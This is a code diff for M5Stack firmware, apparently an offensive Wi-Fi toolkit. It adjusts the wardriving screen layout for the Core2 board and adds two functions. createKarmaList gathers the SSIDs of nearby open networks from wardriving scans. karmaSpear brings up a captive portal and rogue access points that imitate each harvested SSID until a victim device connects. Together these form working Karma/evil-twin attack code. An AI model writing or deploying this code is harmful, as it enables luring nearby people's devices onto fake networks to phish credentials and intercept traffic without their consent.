-    preHeader += ",board=M5AtomS3"; 
+    preHeader += ",board=M5Stack Core2"; 
     preHeader += ",brand=M5Stack";
     return preHeader;
 }
@@ -3722,17 +3840,16 @@ void wardrivingMode() {
     Serial.println("-------------------");    
     M5.Lcd.fillScreen(TFT_BLACK);
     M5.Lcd.setTextColor(TFT_WHITE, TFT_BLACK); 
-    M5.Lcd.setTextSize(1.5);
-    M5.Display.fillRect(0, M5.Display.height() - 30, M5.Display.width(), 30, TFT_RED);
-    M5.Display.setCursor(45, M5.Display.height() - 20);
+    M5.Lcd.setTextSize(2);
+    M5.Display.fillRect(0, M5.Display.height() - 60, M5.Display.width(), 60, TFT_RED);
+    M5.Display.setCursor(135, M5.Display.height() - 40);
     M5.Display.setTextColor(TFT_WHITE);
     M5.Display.println("Stop");
-    M5.Display.setTextColor(TFT_WHITE,TFT_BLACK);
+    M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
     M5.Lcd.setCursor(0, 10);
     M5.Lcd.printf("Scanning...");
-    M5.Lcd.setCursor(0, 30);
+    M5.Lcd.setCursor(0, 40);
     M5.Lcd.println("No GPS Data");
-    
     delay(1000);
     if (!SD.exists("/wardriving")) {
         SD.mkdir("/wardriving");
@@ -3761,7 +3878,7 @@ void wardrivingMode() {
         handleDnsRequestSerial();
 
         if (!scanStarted) {
-            WiFi.scanNetworks(true, true); // Start async scan
+            WiFi.scanNetworks(true, true);
             scanStarted = true;
         }
 
@@ -3778,14 +3895,32 @@ void wardrivingMode() {
                     gpsDataAvailable = true;
 
                     // Affichage des informations GPS sur l'écran
-                    M5.Lcd.setCursor(0, 30);
-                    M5.Lcd.println("Longitude:");
-                    M5.Lcd.println(String(gps.location.lng(), 6));
+                    M5.Lcd.setCursor(0, 40);
+                    M5.Lcd.println("Latitude:  ");
                     M5.Lcd.setCursor(0, 60);
-                    M5.Lcd.println("Latitude:");
                     M5.Lcd.println(String(gps.location.lat(), 6));
-                    M5.Lcd.setCursor(95, 60);
-                    M5.Lcd.println("S:" + String(gps.satellites.value()));
+                    
+                    M5.Lcd.setCursor(170, 40);
+                    M5.Lcd.println("Longitude:");
+                    M5.Lcd.setCursor(170, 60);
+                    M5.Lcd.println(String(gps.location.lng(), 6));
+                   
+                    M5.Lcd.setCursor(0, 90);
+                    M5.Lcd.println("Satellites:");
+                    M5.Lcd.setCursor(0, 110);
+                    M5.Lcd.println(String(gps.satellites.value()));
+                    // Altitude
+                    M5.Lcd.setCursor(170, 90);
+                    M5.Lcd.println("Altitude:");
+                    M5.Lcd.setCursor(170, 110);
+                    M5.Lcd.println(String(gps.altitude.meters(), 2) + "m");
+
+                    // Date et Heure
+                    String dateTime = formatTimeFromGPS();
+                    M5.Lcd.setCursor(0, 140);
+                    M5.Lcd.println("Date/Time:");
+                    M5.Lcd.setCursor(0, 160);
+                    M5.Lcd.println(dateTime);
                 }
             }
         }
@@ -3796,7 +3931,6 @@ void wardrivingMode() {
             String currentTime = formatTimeFromGPS();
             String wifiData = "\n";
             for (int i = 0; i < n; ++i) {
-                // Formater les données pour chaque SSID trouvé
                 String line = WiFi.BSSIDstr(i) + "," + WiFi.SSID(i) + "," + getCapabilities(WiFi.encryptionType(i)) + ",";
                 line += currentTime + ",";
                 line += String(WiFi.channel(i)) + ",";
@@ -3821,12 +3955,10 @@ void wardrivingMode() {
                 file.close();
             }
             
-            // Ouvrir le fichier en mode écriture ou append
             file = SD.open(fileName, isNewFile ? FILE_WRITE : FILE_APPEND);
             
             if (file) {
                 if (isNewFile) {
-                    // Écrire les en-têtes pour un nouveau fichier
                     file.println(createPreHeader());
                     file.println(createHeader());
                 }
@@ -3834,14 +3966,16 @@ void wardrivingMode() {
                 file.close();
             }
 
-            scanStarted = false; // Reset for the next scan
-                     // Mettre à jour le nombre de WiFi à proximité sur l'écran
+            scanStarted = false;
             M5.Lcd.setCursor(0, 10);
             M5.Lcd.printf("Near WiFi: %d\n", n);
         }
 
-        if (M5.BtnA.isPressed()) {
+        if (M5.BtnB.isPressed()) {
             exitWardriving = true;
+            if (confirmPopup("List Open Networks?")) {
+                createKarmaList(maxIndex);
+            }
             waitAndReturnToMenu("Stopping Wardriving.");
             Serial.println("-------------------");
             Serial.println("Stopping Wardriving");
@@ -3867,7 +4001,6 @@ String getCapabilities(wifi_auth_mode_t encryptionType) {
     }
 }
 
-
 String formatTimeFromGPS() {
     if (gps.time.isValid() && gps.date.isValid()) {
         char dateTime[30];
@@ -3875,6 +4008,143 @@ String formatTimeFromGPS() {
                                                          gps.time.hour(), gps.time.minute(), gps.time.second());
         return String(dateTime);
     } else {
-        return "0000-00-00 00:00:00"; // Retourner une valeur par défaut si l'heure GPS n'est pas valide
+        return "0000-00-00 00:00:00";
     }
+}
+
+
+void createKarmaList(int maxIndex) {
+    
+    std::set<std::string> uniqueSSIDs;
+    File karmaListRead = SD.open("/KarmaList.txt", FILE_READ);
+    if (karmaListRead) {
+        while (karmaListRead.available()) {
+            String ssid = karmaListRead.readStringUntil('\n');
+            ssid.trim();
+            if (ssid.length() > 0) {
+                uniqueSSIDs.insert(ssid.c_str());
+            }
+        }
+        karmaListRead.close();
+    }
+
+    File file = SD.open("/wardriving/wardriving-0" + String(maxIndex + 1) + ".csv", FILE_READ);
+if (!file) {
+    Serial.println("Error opening scan file");
+    return;
+} else {
+    Serial.println("Scan file opened successfully");
+}
+
+while (file.available()) {
+    String line = file.readStringUntil('\n');
+    if (isNetworkOpen(line)) {
+        String ssid = extractSSID(line);
+        uniqueSSIDs.insert(ssid.c_str());
+    }
+}
+    file.close();
+
+    File karmaListWrite = SD.open("/KarmaList.txt", FILE_WRITE);
+if (!karmaListWrite) {
+    Serial.println("Error opening KarmaList.txt for writing");
+    return;
+} else {
+    Serial.println("KarmaList.txt opened for writing");
+}
+
+Serial.println("Writing to KarmaList.txt");
+for (const auto& ssid : uniqueSSIDs) {
+    karmaListWrite.println(ssid.c_str());
+    Serial.println("Writing SSID: " + String(ssid.c_str()));
+}
+}
+
+bool isNetworkOpen(const String& line) {
+    int securityTypeStart = nthIndexOf(line, ',', 1) + 1;
+    int securityTypeEnd = nthIndexOf(line, ',', 2);
+    String securityType = line.substring(securityTypeStart, securityTypeEnd);
+    return securityType.indexOf("[OPEN][ESS]") != -1;
+}
+
+String extractSSID(const String& line) {
+    int ssidStart = nthIndexOf(line, ',', 0) + 1;
+    int ssidEnd = nthIndexOf(line, ',', 1);
+    String ssid = line.substring(ssidStart, ssidEnd);
+    return ssid;
+}
+
+int nthIndexOf(const String& str, char toFind, int nth) {
+    int found = 0;
+    int index = -1;
+    while (found <= nth && index < (int) str.length()) {
+        index = str.indexOf(toFind, index + 1);
+        if (index == -1) break;
+        found++;
+    }
+    return index;
+}
+
+
+void karmaSpear() {
+    isAutoKarmaActive = true;
+    createCaptivePortal();
+    File karmaListFile = SD.open("/KarmaList.txt", FILE_READ);
+    if (!karmaListFile) {
+        Serial.println("Error opening KarmaList.txt");
+        waitAndReturnToMenu("Error opening KarmaList"); 
+        return;
+    }
+    if (karmaListFile.available() == 0) {
+        karmaListFile.close();
+        Serial.println("KarmaFile empty.");
+        waitAndReturnToMenu("KarmaFile empty."); 
+        return;
+    }
+
+    int totalLines = 0;
+    while (karmaListFile.available()) {
+        karmaListFile.readStringUntil('\n');
+        totalLines++;
+        if (M5.BtnA.wasPressed()) { 
+            karmaListFile.close();
+            waitAndReturnToMenu("  Stopping...");
+            return;
+        }
+    }
+    karmaListFile.seek(0); 
+
+    int currentLine = 0;
+    while (karmaListFile.available()) {
+        if (M5.BtnA.isPressed()) { 
+            karmaListFile.close();
+            isAutoKarmaActive = false;
+            waitAndReturnToMenu(" Karma Spear Stopped.");
+            return;
+        }
+
+        String ssid = karmaListFile.readStringUntil('\n');
+        ssid.trim();
+        
+        if (ssid.length() > 0) {
+            activateAPForAutoKarma(ssid.c_str());
+            Serial.println("Created Karma AP for SSID: " + ssid);
+            displayAPStatus(ssid.c_str(), millis(), autoKarmaAPDuration);
+
+            int remainingLines = totalLines - (++currentLine);
+            String displayText = String(remainingLines) + "/" + String(totalLines);
+            M5.Display.setCursor((M5.Display.width() / 2) - 25, 10);
+            M5.Display.print(displayText);
+            
+            if (karmaSuccess) {
+                M5.Display.clear();
+                break;
+            }
+            delay(200);
+        }
+    }
+    karmaListFile.close();
+    isAutoKarmaActive = false;
+    Serial.println("Karma Spear Failed...");
+    waitAndReturnToMenu(" Karma Spear Failed...");
 }
